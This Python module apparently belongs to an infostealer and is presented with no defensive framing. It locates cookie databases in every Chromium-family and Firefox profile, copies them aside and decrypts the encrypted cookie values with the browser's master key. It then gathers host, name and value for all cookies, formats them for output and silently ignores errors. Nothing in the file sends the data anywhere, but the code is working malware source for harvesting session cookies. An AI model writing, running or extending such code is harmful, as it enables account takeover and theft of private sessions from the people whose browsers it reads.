import os
import tempfile
import shutil
import sqlite3
from utils import get_master_key, DecryptValue, get_all_browser_profiles, load_json_config, expand_path

def extract_cookies_chromium(browser_config, limit=None):
    cookies = []
    
    if not limit:
        limit = 999999
    
    for browser in browser_config.get("chromium_browsers", []):
        browser_path = expand_path(browser["path"])
        browser_name = browser["name"]
        
        if not os.path.exists(browser_path):
            continue
        
        master_key = get_master_key(browser_path)
        if not master_key:
            continue
        
        test_profiles = get_all_browser_profiles(browser_path)
        
        for profile in test_profiles:
            possible_paths = [
                os.path.join(browser_path, profile, "Network", "Cookies"),
                os.path.join(browser_path, profile, "Cookies"),
                os.path.join(browser_path, "Network", "Cookies"),
                os.path.join(browser_path, "Cookies")
            ]
            
            cookies_db_path = None
            for p in possible_paths:
                if os.path.exists(p):
                    cookies_db_path = p
                    break
            
            if not cookies_db_path:
                continue
            
            temp_db = os.path.join(tempfile.gettempdir(), f"Cookies_{browser_name}_{profile}_{os.getpid()}.db")
            
            try:
                shutil.copy2(cookies_db_path, temp_db)
                conn = sqlite3.connect(temp_db, timeout=5)
                cursor = conn.cursor()
                
                cursor.execute(f"SELECT host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies LIMIT {limit}")
                
                for row in cursor.fetchall():
                    host, name, value, encrypted_value, path, expires, secure, httponly = row
                    
                    if encrypted_value:
                        decrypted = DecryptValue(encrypted_value, master_key)
                        if decrypted:
                            value = decrypted
                    
                    if value:
                        cookies.append({
                            "browser": browser_name,
                            "profile": profile,
                            "host": host,
                            "name": name,
                            "value": value,
                            "path": path,
                            "expires": expires,
                            "secure": secure,
                            "httponly": httponly
                        })
                
                cursor.close()
                conn.close()
            except:
                pass
            finally:
                if os.path.exists(temp_db):
                    try: os.remove(temp_db)
                    except: pass
    
    return cookies

def extract_cookies_firefox(firefox_config, limit=None):
    cookies = []
    firefox_data = firefox_config.get("firefox", {})
    firefox_path = expand_path(firefox_data.get("profiles_path", "{APPDATA}/Mozilla/Firefox/Profiles"))
    
    if not limit:
        limit = 999999
    
    if not os.path.exists(firefox_path):
        return cookies
    
    for profile in os.listdir(firefox_path):
        profile_path = os.path.join(firefox_path, profile)
        cookies_db_name = firefox_data.get("databases", {}).get("cookies", "cookies.sqlite")
        cookies_db = os.path.join(profile_path, cookies_db_name)
        
        if not os.path.exists(cookies_db):
            continue
        
        temp_db = os.path.join(tempfile.gettempdir(), f"Cookies_Firefox_{profile}_{os.getpid()}.db")
        
        try:
            shutil.copy2(cookies_db, temp_db)
            conn = sqlite3.connect(temp_db, timeout=5)
            cursor = conn.cursor()
            
            cursor.execute(f"SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies LIMIT {limit}")
            
            for row in cursor.fetchall():
                host = row[0]
                name = row[1]
                value = row[2]
                path = row[3]
                expires = row[4]
                secure = row[5]
                httponly = row[6]
                
                cookies.append({
                    "browser": "Firefox",
                    "profile": profile,
                    "host": host,
                    "name": name,
                    "value": value,
                    "path": path,
                    "expires": expires,
                    "secure": secure,
                    "httponly": httponly
                })
            
            cursor.close()
            conn.close()
        except:
            pass
        finally:
            try:
                os.remove(temp_db)
            except:
                pass
    
    return cookies

def extract_cookies(limit=None):
    all_cookies = []
    
    browser_config = load_json_config("browser.json")
    firefox_config = load_json_config("firefox.json")
    
    all_cookies.extend(extract_cookies_chromium(browser_config, limit if limit else 999999))
    all_cookies.extend(extract_cookies_firefox(firefox_config, limit if limit else 999999))
    
    return all_cookies

def format_cookies(cookies):
    if not cookies:
        return None
    
    formatted = []
    for cookie in cookies:
        display_value = cookie['value'][:80] + "..." if len(cookie['value']) > 80 else cookie['value']
        
        formatted.append(
            f"[{cookie['browser']} - {cookie['profile']}]\n"
            f"Host: {cookie['host']}\n"
            f"Name: {cookie['name']}\n"
            f"Value: {display_value}\n"
            f"Path: {cookie['path']}\n"
            f"{'─'*40}"
        )
    
    return "\n".join(formatted)

def get_cookies(limit=None):
    cookies = extract_cookies(limit)
    return format_cookies(cookies)

def get_cookies_json(limit=None):
    return extract_cookies(limit)